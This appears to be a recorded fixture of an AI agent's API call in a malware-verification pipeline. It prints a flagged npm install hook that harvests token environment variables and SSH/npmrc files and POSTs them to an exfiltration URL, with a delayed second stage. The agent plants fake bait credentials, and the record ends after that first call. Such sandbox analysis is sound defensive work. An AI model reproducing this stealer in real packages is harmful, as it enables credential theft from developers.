@@ -1,0 +1,407 @@
+{
+  "id": "064_agent_1375948b",
+  "role": "agent",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Arm one runnable sandbox experiment for a security hypothesis by calling setup\ntools, then a single trigger. Plant bait, defeat visible gates, and invoke a\nreal package entry point. Each tool call is validated against the real oracle:\nif arguments are wrong you get a precise error — fix them and retry. The\nexperiment is complete only when `finalize` returns ARMED."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent (benign baseline)\nDNS resolution with caching\n\n## Flag\n- file: install-hook.js\n- lines: 51-70\n- why: HTTP POST of serialized stolen data to exfiltration server\n\n## Flagged code\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const os = require(\"os\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: const http = require(\"http\");\n7: \n8: const EXFIL_URL = \"http://localhost:9999/exfil\";\n9: \n10: function stage1() {\n11:   const stolen = {\n12:     stage: 1,\n13:     timestamp: new Date().toISOString(),\n14:     hostname: os.hostname(),\n15:     username: os.userInfo().username,\n16:     platform: process.platform,\n17:     env: {},\n18:     tokens: {},\n19:   };\n20: \n21:   const sensitivePatterns =\n22:     /NPM_TOKEN|npm_config|AWS_ACCESS|AWS_SECRET|GITHUB_TOKEN|GH_TOKEN|GITLAB|AZURE|DOCKER|CI_TOKEN/i;\n23:   for (const [key, value] of Object.entries(process.env)) {\n24:     if (sensitivePatterns.test(key)) {\n25:       stolen.env[key] = value;\n26:     }\n27:   }\n28: \n29:   const home = os.homedir();\n30:   const tokenFiles = [\n31:     path.join(home, \".npmrc\"),\n32:     path.join(home, \".ssh\", \"id_rsa\"),\n33:     path.join(home, \".ssh\", \"id_ed25519\"),\n34:   ];\n35:   for (const filePath of tokenFiles) {\n36:     try {\n37:       stolen.tokens[path.basename(filePath)] = fs.readFileSync(\n38:         filePath,\n39:         \"utf-8\"\n40:       );\n41:     } catch (e) {\n42: \n43:     }\n44:   }\n45: \n46:   exfil(stolen);\n47: \n48:   scheduleStage2();\n49: }\n50: \n51: function exfil(data) {\n52:   const payload = JSON.stringify(data);\n53:   const url = new URL(EXFIL_URL);\n54:   const req = http.request(\n55:     {\n56:       hostname: url.hostname,\n57:       port: url.port,\n58:       path: url.pathname,\n59:       method: \"POST\",\n60:       headers: {\n61:         \"Content-Type\": \"application/json\",\n62:         \"Content-Length\": Buffer.byteLength(payload),\n63:       },\n64:     },\n65:     () => {}\n66:   );\n67:   req.on(\"error\", () => {});\n68:   req.write(payload);\n69:   req.end();\n70: }\n71: \n72: function scheduleStage2() {\n73: \n74:   const delay = SAFE_TEST_MODE ? 5000 : 72 * 60 * 60 * 1000;\n75: \n76:   setTimeout(() => {\n77:     try {\n78:       require(\"./lib/loader.js\");\n79:     } catch (e) {\n80: \n81:     }\n82:   }, delay);\n83: }\n84: \n85: stage1();\n```\n\n## Setup tools\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\n## Proposal\nclaim: dns_exfil\nseverity: critical\ndescription: The claim is that the installation hook makes an HTTP POST request containing stolen credentials and environment variables to an attacker-controlled exfiltration server.\ntarget intent: install-hook.js\nplanned tools: ['setEnv', 'plantFiles', 'stubUrl', 'trigger']\nrationale: The flag install-hook.js calls exfil() which HTTP POSTs a JSON blob containing the hostname, username, all environment variables matching sensitive patterns, and the contents of several token files (~/.npmrc, ~/.ssh/id_rsa, ~/.ssh/id_ed25519) to a hardcoded URL. The environment variables planted by setEnv and the files planted by plantFiles will act as bait to confirm exfiltration. stubUrl will intercept the POST to the specified URL and record the data, so the experiment can verify the claim without actually sending data to an external server. The trigger target is install-hook.js because that is the file that runs the exfiltration logic.\n\n## Valid trigger targets\n['index.js', 'install-hook.js']\n\nBuild the experiment by calling setup tools (each is validated — I return a precise error if wrong; fix and retry), then you MUST call `finalize` exactly once with the trigger. You may call several setup tools in one turn. The run is complete only once `finalize` returns ARMED — do not stop before that. Escape newlines in every JSON string. Keep the experiment minimal.\n\nWhen you author JavaScript (a preload script, a custom driver, or a patchFile replacement), reference package files by a relative path with a leading './' (require('./src/x.js')) or by an absolute path under /pkg (require('/pkg/src/x.js')). A bare specifier like require('src/x.js') is resolved as a node_modules PACKAGE and fails with \"Cannot find module\". Planted file paths must be absolute (/pkg/... or /home/node/...). The sandbox working directory is /pkg."
+        }
+      ],
+      "tools": [
+        {
+          "type": "function",
+          "function": {
+            "name": "setEnv",
+            "description": "Inject env vars (plant creds / defeat env gates).",
+            "parameters": {
+              "$defs": {
+                "_Kv": {
+                  "additionalProperties": false,
+                  "properties": {
+                    "name": {
+                      "title": "Name",
+                      "type": "string"
+                    },
+                    "value": {
+                      "title": "Value",
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "name",
+                    "value"
+                  ],
+                  "title": "_Kv",
+                  "type": "object"
+                }
+              },
+              "additionalProperties": false,
+              "properties": {
+                "vars": {
+                  "items": {
+                    "$ref": "#/$defs/_Kv"
+                  },
+                  "title": "Vars",
+                  "type": "array"
+                }
+              },
+              "required": [
+                "vars"
+              ],
+              "title": "SetEnvArgs",
+              "type": "object"
+            }
+          }
+        },
+        {
+          "type": "function",
+          "function": {
+            "name": "plantFiles",
+            "description": "Seed absolute-path files with bait content.",
+            "parameters": {
+              "$defs": {
+                "_FileSpec": {
+                  "additionalProperties": false,
+                  "properties": {
+                    "path": {
+                      "title": "Path",
+                      "type": "string"
+                    },
+                    "content": {
+                      "title": "Content",
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "path",
+                    "content"
+                  ],
+                  "title": "_FileSpec",
+                  "type": "object"
+                }
+              },
+              "additionalProperties": false,
+              "properties": {
+                "files": {
+                  "items": {
+                    "$ref": "#/$defs/_FileSpec"
+                  },
+                  "title": "Files",
+                  "type": "array"
+                }
+              },
+              "required": [
+                "files"
+              ],
+              "title": "PlantFilesArgs",
+              "type": "object"
+            }
+          }
+        },
+        {
+          "type": "function",
+          "function": {
+            "name": "stubUrl",
+            "description": "Return canned HTTP responses for URL patterns.",
+            "parameters": {
+              "$defs": {
+                "_Kv": {
+                  "additionalProperties": false,
+                  "properties": {
+                    "name": {
+                      "title": "Name",
+                      "type": "string"
+                    },
+                    "value": {
+                      "title": "Value",
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "name",
+                    "value"
+                  ],
+                  "title": "_Kv",
+                  "type": "object"
+                },
+                "_Stub": {
+                  "additionalProperties": false,
+                  "properties": {
+                    "pattern": {
+                      "title": "Pattern",
+                      "type": "string"
+                    },
+                    "responseStatus": {
+                      "default": 200,
+                      "title": "Responsestatus",
+                      "type": "integer"
+                    },
+                    "responseBody": {
+                      "default": "ok",
+                      "title": "Responsebody",
+                      "type": "string"
+                    },
+                    "responseHeaders": {
+                      "items": {
+                        "$ref": "#/$defs/_Kv"
+                      },
+                      "title": "Responseheaders",
+                      "type": "array"
+                    }
+                  },
+                  "required": [
+                    "pattern"
+                  ],
+                  "title": "_Stub",
+                  "type": "object"
+                }
+              },
+              "additionalProperties": false,
+              "properties": {
+                "stubs": {
+                  "items": {
+                    "$ref": "#/$defs/_Stub"
+                  },
+                  "title": "Stubs",
+                  "type": "array"
+                }
+              },
+              "required": [
+                "stubs"
+              ],
+              "title": "StubUrlArgs",
+              "type": "object"
+            }
+          }
+        },
+        {
+          "type": "function",
+          "function": {
+            "name": "patchFile",
+            "description": "Exact-string rewrites of package files.",
+            "parameters": {
+              "$defs": {
+                "_Patch": {
+                  "additionalProperties": false,
+                  "properties": {
+                    "path": {
+                      "title": "Path",
+                      "type": "string"
+                    },
+                    "replacements": {
+                      "items": {
+                        "$ref": "#/$defs/_Replacement"
+                      },
+                      "title": "Replacements",
+                      "type": "array"
+                    }
+                  },
+                  "required": [
+                    "path",
+                    "replacements"
+                  ],
+                  "title": "_Patch",
+                  "type": "object"
+                },
+                "_Replacement": {
+                  "additionalProperties": false,
+                  "properties": {
+                    "pattern": {
+                      "title": "Pattern",
+                      "type": "string"
+                    },
+                    "replacement": {
+                      "title": "Replacement",
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "pattern",
+                    "replacement"
+                  ],
+                  "title": "_Replacement",
+                  "type": "object"
+                }
+              },
+              "additionalProperties": false,
+              "properties": {
+                "patches": {
+                  "items": {
+                    "$ref": "#/$defs/_Patch"
+                  },
+                  "title": "Patches",
+                  "type": "array"
+                }
+              },
+              "required": [
+                "patches"
+              ],
+              "title": "PatchFileArgs",
+              "type": "object"
+            }
+          }
+        },
+        {
+          "type": "function",
+          "function": {
+            "name": "preload",
+            "description": "Inject a Node preload script.",
+            "parameters": {
+              "additionalProperties": false,
+              "properties": {
+                "code": {
+                  "title": "Code",
+                  "type": "string"
+                }
+              },
+              "required": [
+                "code"
+              ],
+              "title": "PreloadArgs",
+              "type": "object"
+            }
+          }
+        },
+        {
+          "type": "function",
+          "function": {
+            "name": "setDate",
+            "description": "Freeze wall-clock at an ISO timestamp.",
+            "parameters": {
+              "additionalProperties": false,
+              "properties": {
+                "iso": {
+                  "title": "Iso",
+                  "type": "string"
+                }
+              },
+              "required": [
+                "iso"
+              ],
+              "title": "SetDateArgs",
+              "type": "object"
+            }
+          }
+        },
+        {
+          "type": "function",
+          "function": {
+            "name": "finalize",
+            "description": "Set the single trigger and compile. Call LAST. target = one existing entry point, or pass driverCode with custom JS.",
+            "parameters": {
+              "additionalProperties": false,
+              "properties": {
+                "kind": {
+                  "default": "entrypoint",
+                  "title": "Kind",
+                  "type": "string"
+                },
+                "target": {
+                  "title": "Target",
+                  "type": "string"
+                },
+                "driverCode": {
+                  "anyOf": [
+                    {
+                      "type": "string"
+                    },
+                    {
+                      "type": "null"
+                    }
+                  ],
+                  "default": null,
+                  "title": "Drivercode"
+                },
+                "argv": {
+                  "items": {
+                    "type": "string"
+                  },
+                  "title": "Argv",
+                  "type": "array"
+                },
+                "stdin": {
+                  "anyOf": [
+                    {
+                      "type": "string"
+                    },
+                    {
+                      "type": "null"
+                    }
+                  ],
+                  "default": null,
+                  "title": "Stdin"
+                }
+              },
+              "required": [
+                "target"
+              ],
+              "title": "FinalizeArgs",
+              "type": "object"
+            }
+          }
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-1375948b",
+      "model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "provider": "Nvidia",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "tool_calls",
+          "message": {
+            "role": "assistant",
+            "content": null,
+            "tool_calls": [
+              {
+                "id": "call-728b12e6-908c-4ddc-ad36-39cc8b51a972",
+                "function": {
+                  "arguments": "{\"vars\":[{\"name\":\"NPM_TOKEN\",\"value\":\"npm_token_123\"},{\"name\":\"AWS_ACCESS_KEY_ID\",\"value\":\"AKIAEXAMPLEKEY\"},{\"name\":\"AWS_SECRET_ACCESS_KEY\",\"value\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"},{\"name\":\"GITHUB_TOKEN\",\"value\":\"ghp_exampletoken123\"}]}",
+                  "name": "setEnv"
+                },
+                "type": "function",
+                "index": 0
+              }
+            ],
+            "reasoning": [
+              {
+                "type": "reasoning.text",
+                "text": "We need to construct the experiment: We need to set up environment variables (setEnv) with some credentials patterns (e.g., NPM_TOKEN, AWS_ACCESS_KEY_ID, etc). Plant files: we can plant .npmrc and ssh id files with some content. StubUrl: intercept POST to http://localhost:9999/exfil. Trigger target: install-hook.js. Then finalize with target \"install-hook.js\". The finalize call must be after setup calls.\n\nWe need to call setEnv, plantFiles, stubUrl, then finalize. Possibly all in one turn? We can do multiple calls. We'll need to format JSON correctly with escaped newlines.\n\nLet's plan calls:\n\n1. setEnv: vars array of objects with name and value. We'll set e.g., NPM_TOKEN=\"npm_token_123\", AWS_ACCESS_KEY_ID=\"AKIA..., AWS_SECRET_ACCESS_KEY=\"secret\", GITHUB_TOKEN=\"ghp_...\".\n\n2. plantFiles: files array. We'll need absolute paths. The sandbox working directory is /pkg. The home directory for node user? Usually /home/node. We'll plant /home/node/.npmrc with content \"registry=...\", and /home/node/.ssh/id_rsa and id_ed25519 with some fake keys.\n\n3. stubUrl: stubs array with pattern matching the URL. Use pattern \"http://localhost:9999/exfil\". Could also use wildcard? We'll set responseBody maybe empty, status 200.\n\n4. finalize: target \"install-hook.js\". No argv needed; can pass empty array.\n\nWe must ensure we escape newlines in JSON strings. The content of files may have newlines; we need to escape them as \\n.\n\nLet's craft.\n\nFirst call setEnv.\n\n",
+                "format": "unknown",
+                "index": 0
+              }
+            ]
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 3054,
+        "completion_tokens": 500,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "7cd70726dc48",
+    "transport": "text",
+    "recordedStatus": "ok",
+    "recordedTs": "2026-07-23T10:48:38.323Z",
+    "recordedLatencyMs": 5774
+  }
+}
